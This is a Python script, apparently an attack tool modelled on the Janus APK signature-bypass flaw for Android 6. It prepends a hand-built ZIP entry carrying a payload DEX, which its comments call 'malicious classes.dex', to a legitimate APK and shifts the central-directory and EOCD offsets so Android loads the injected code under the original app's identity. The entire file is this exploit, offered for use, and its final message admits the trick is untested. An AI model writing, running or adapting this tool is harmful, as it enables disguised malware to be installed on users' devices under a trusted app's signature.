#!/usr/bin/env python3
# janus_zip_trick.py - Try ZIP/DEX hybrid approach for Android 6
import struct, sys, os, io, zlib

if len(sys.argv) != 4:
    sys.exit("Usage: janus_zip_trick.py  <original.apk>  <payload.dex>  <output.apk>")

orig_apk, payload_dex, out_apk = sys.argv[1:]

# Read files
with open(orig_apk, 'rb') as f:
    orig_data = f.read()
with open(payload_dex, 'rb') as f:
    dex_data = f.read()

print(f"📱 Original APK: {len(orig_data)} bytes")
print(f"💣 Payload DEX: {len(dex_data)} bytes")

# Create a ZIP local file header for our malicious DEX as "classes.dex"
# This makes Android think our DEX is the legitimate classes.dex
def create_zip_entry(filename, data):
    name_bytes = filename.encode('utf-8')
    lfh = io.BytesIO()
    
    lfh.write(b'PK\x03\x04')                    # Local file header signature
    lfh.write(b'\x14\x00')                      # Version needed to extract
    lfh.write(b'\x00\x00')                      # General purpose bit flag
    lfh.write(b'\x00\x00')                      # Compression method (stored)
    lfh.write(b'\x00\x00\x00\x00')              # Last mod file time/date
    lfh.write(struct.pack('<I', zlib.crc32(data) & 0xffffffff))  # CRC-32
    lfh.write(struct.pack('<I', len(data)))     # Compressed size
    lfh.write(struct.pack('<I', len(data)))     # Uncompressed size
    lfh.write(struct.pack('<H', len(name_bytes))) # File name length
    lfh.write(b'\x00\x00')                      # Extra field length
    lfh.write(name_bytes)                       # File name
    lfh.write(data)                             # File data
    
    return lfh.getvalue()

# Create ZIP entry for our malicious DEX
print("🔧 Creating ZIP entry for malicious classes.dex...")
malicious_entry = create_zip_entry("classes.dex", dex_data)

# Find End of Central Directory in original APK
eocd_sig = b'PK\x05\x06'
eocd_offset = orig_data.rfind(eocd_sig)
if eocd_offset == -1:
    sys.exit("❌ EOCD not found")

print(f"📍 Found EOCD at offset: 0x{eocd_offset:08x}")

# Parse EOCD
eocd_data = orig_data[eocd_offset:eocd_offset+22]
(disk_num, disk_cd, disk_entries, total_entries, cd_size, cd_offset) = struct.unpack('<HHHHII', eocd_data[4:20])

print(f"📊 Central Directory: {total_entries} entries, offset=0x{cd_offset:08x}")

shift_amount = len(malicious_entry)

# Update Central Directory entries
cd_start = cd_offset
cd_end = cd_start + cd_size
cd_data = bytearray(orig_data[cd_start:cd_end])
entry_pos = 0

print("🔧 Updating Central Directory offsets...")
for i in range(total_entries):
    if cd_data[entry_pos:entry_pos+4] != b'PK\x01\x02':
        sys.exit(f"❌ Bad CD signature at entry {i}")
    
    # Update local header offset
    current_offset = struct.unpack('<I', cd_data[entry_pos+42:entry_pos+46])[0]
    new_offset = current_offset + shift_amount
    struct.pack_into('<I', cd_data, entry_pos+42, new_offset)
    
    # Move to next entry
    filename_len, extra_len, comment_len = struct.unpack('<HHH', cd_data[entry_pos+28:entry_pos+34])
    entry_pos += 46 + filename_len + extra_len + comment_len

# Update EOCD
new_cd_offset = cd_offset + shift_amount
updated_eocd = bytearray(orig_data[eocd_offset:eocd_offset+22])
struct.pack_into('<I', updated_eocd, 16, new_cd_offset)

print(f"🔧 Updated EOCD: CD offset 0x{cd_offset:08x} → 0x{new_cd_offset:08x}")

# Write the hybrid Janus APK
print("🚀 Creating hybrid Janus APK...")
with open(out_apk, 'wb') as f:
    # 1. Write malicious ZIP entry first (contains our DEX as "classes.dex")
    f.write(malicious_entry)
    
    # 2. Write original APK data up to Central Directory
    f.write(orig_data[:cd_start])
    
    # 3. Write updated Central Directory
    f.write(cd_data)
    
    # 4. Write updated EOCD
    f.write(updated_eocd)
    
    # 5. Write any EOCD comment
    eocd_comment = orig_data[eocd_offset+22:]
    if eocd_comment:
        f.write(eocd_comment)

final_size = os.path.getsize(out_apk)
print(f"✅ Created: {out_apk}")
print(f"📊 Final size: {final_size} bytes (+{shift_amount} from original)")
print(f"🎯 Structure: Malicious classes.dex as ZIP entry, then original APK")
print(f"💡 This should trick Android into loading our DEX as the main classes.dex!")
